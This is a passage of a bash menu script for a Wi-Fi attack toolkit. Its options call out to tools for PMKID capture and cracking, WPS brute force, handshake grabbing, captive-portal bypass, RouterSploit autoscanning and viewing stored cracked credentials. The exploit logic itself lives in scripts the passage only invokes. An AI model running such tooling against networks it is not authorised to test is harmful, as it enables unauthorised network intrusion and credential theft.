python3 "$workdir/wscan.py"
# clear
echo
echo
echo "wscan done."
}

bypass_cap()
{
  trap 'echo "opcapture was interrupted. Returning to main script..."' SIGINT

echo "Running opcapture..."
python3 "$workdir/opcapture.py"
# clear
echo
echo
echo "opcapture done."
}

router_autoscan()
{
  trap 'echo "rs_autoscan was interrupted. Returning to main script..."' SIGINT

echo
echo "*NOTE: This requires RouterSploit to be installed in a virtual environment!"
echo 
echo "Check for help: github.com/dtrail/fix-and-run-routersploit"
echo
 "$workdir/rs_autoscan.sh"
# clear
echo
echo
echo "rs_autoscan done."
}

check_creds()
{
  while true; do
 
  echo " "
  echo "Manage Creds Files"
  echo "******************"
  echo "1) Check auto-stored WPS creds"
  echo "2) Check/Change custom creds file"
  echo "0) Back to main menu"
  echo " "
  echo "**NOTE: If you mess up that file, i.e. by adding empty spaces accidently,OneShot will STOP working!"
  echo 
  read -p "pick option: " cred
  case $cred in
        1)
          cat /sdcard/nh_files/modules/reports/stored.txt;
          ;;
        2)
          nano $workdir/wps_log.txt
          ;;
        0)
          return
          ;;
        *)
          echo -e "${red}Invalid option.${nc}"
          ;;
    esac
  done
}
# Main menu
while true; do
    echo ""
    echo "______________________________________"
    echo "*** NETWORK SNIFFING AND AUDITING ***"
    echo ""
    echo " 1. List Wi-Fi adapters"
    echo " 2. Select Wi-Fi adapter"
    echo "22. Reset adapter"
    echo " 3. Sniff with tcpdump"
    echo " 4. Sniff with tshark"
    echo " 5. Capture PMKID with hcxdumptool"
    echo " 6. Convert pcapng to hashcat 22000 format"
    echo " 7. PMKID cracking"
    echo " 8. WPS Networks"
    echo " 9. WPS Special Brute Force"
    echo "10. Monitor mode menu"
    echo "11. Handshake Grabber Menu"
    echo "12. Connect to (cracked) Network"
    echo "13. Manage Credentials"
    echo "14. Bypass Captive Portal"
    echo "15. RouterSploit with autoscan"
    echo " W. WPS Attack Environment"
    echo " D. Dump all nearby networks"
    echo " 0. Exit"
    echo "--------------------------------------"
    read -p "Choose an option: " option

    case $option in
        1)
            list_adapters
            ;;
        2)
            list_adapters
            read -p "Enter the adapter to use: " adapter
            ;;
       22)
            reset_adapter
            ;;
        3)
            if [ -z "$adapter" ]; then
                echo "No adapter selected. Please select a Wi-Fi adapter first."
            else
                sniff_tcpdump $adapter
            fi
            ;;
        4)
            if [ -z "$adapter" ]; then
                echo "No adapter selected. Please select a Wi-Fi adapter first."
            else
                sniff_tshark $adapter
            fi
            ;;
        5)
            if [ -z "$adapter" ]; then
                echo "No adapter selected. Please select a Wi-Fi adapter first."
            else
                capture_pmkid $adapter
            fi
            ;;
        6)
            convert_selected_pmkid
            ;;
        7)
            pmkid_crack_menu
            ;;
        8)
            scan_wps_networks
            ;;
        9)
           special_bruteforce_menu
           ;;
           
        10)
            monitor_mode_menu
            ;;
            
        11)
            handshake_grabber_menu
            ;;
          
        12)
            enter_network
            ;;
        13)
            check_creds
            ;;
        14)
            bypass_cap
            ;;
        15)
            router_autoscan
            ;;
         w)
            pixie_dust_menu
            ;;
         d)
            dump_networks
            ;;
        0)
            echo "Exiting."
            break
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
done